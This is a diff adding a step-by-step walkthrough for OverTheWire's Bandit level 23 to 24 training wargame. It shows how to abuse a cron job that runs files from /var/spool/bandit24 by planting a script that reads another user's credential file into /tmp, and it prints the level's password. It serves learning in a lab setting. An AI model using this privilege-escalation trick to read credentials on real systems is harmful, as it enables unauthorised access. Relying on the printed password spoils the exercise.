@@ -1,0 +1,90 @@
+// Bandit Level 23 → Level 24
+
+URL: https://overthewire.org/wargames/bandit/
+
+Step1: Log in to the Bandit Level 23 server:
+
+        ssh bandit23@bandit.labs.overthewire.org -p 2220
+
+Step2: Enter the password obtained from Bandit Level 22.
+
+Step3: Check the cron job:
+
+        cat /etc/cron.d/cronjob_bandit24
+
+Step4: We can see that a script is executed as the `bandit24` user:
+
+        /usr/bin/cronjob_bandit24.sh
+
+Step5: Read the script:
+
+        cat /usr/bin/cronjob_bandit24.sh
+
+Step6: The important part of the script is:
+
+        cd /var/spool/$myname
+
+        for i in * .*;
+        do
+            if [ "$i" != "." -a "$i" != ".." ];
+            then
+                timeout -s 9 60 "./$i"
+                rm -f "./$i"
+            fi
+        done
+
+Step7: Since the script runs as `bandit24`, `$myname` becomes:
+
+        bandit24
+
+Step8: Therefore, the cron job executes files placed in:
+
+        /var/spool/bandit24
+
+Step9: Our goal is to create a shell script that reads the Bandit Level 24 password and saves it somewhere that `bandit23` can read.
+
+Step10: Create a temporary directory:
+
+        mkdir /tmp/bandit23
+
+Step11: Give ourselves permission to use it:
+
+        chmod 777 /tmp/bandit23
+
+Step12: Create our shell script:
+
+        nano /tmp/bandit23/script.sh
+
+Step13: Put this inside the script:
+
+        #!/bin/bash
+        cat /etc/bandit_pass/bandit24 > /tmp/bandit23/password
+        chmod 644 /tmp/bandit23/password
+
+Step14: Make the script executable:
+
+        chmod +x /tmp/bandit23/script.sh
+
+Step15: Copy the script into the directory monitored by the cron job:
+
+        cp /tmp/bandit23/script.sh /var/spool/bandit24/
+
+Step16: Wait for the cron job to execute the script. It normally runs once every minute.
+
+Step17: After the script has been executed, read the password:
+
+        cat /tmp/bandit23/password
+
+Step18: The password for Bandit Level 24 is:
+
+        gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+Step19: The script we placed in `/var/spool/bandit24/` is automatically deleted after execution.
+
+Step20: The Bandit Level 23 → Level 24 challenge is solved.
+
+Step21: Password for Bandit Level 24:
+
+        gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+Step22: Congratulations!! you have solved this problem!!
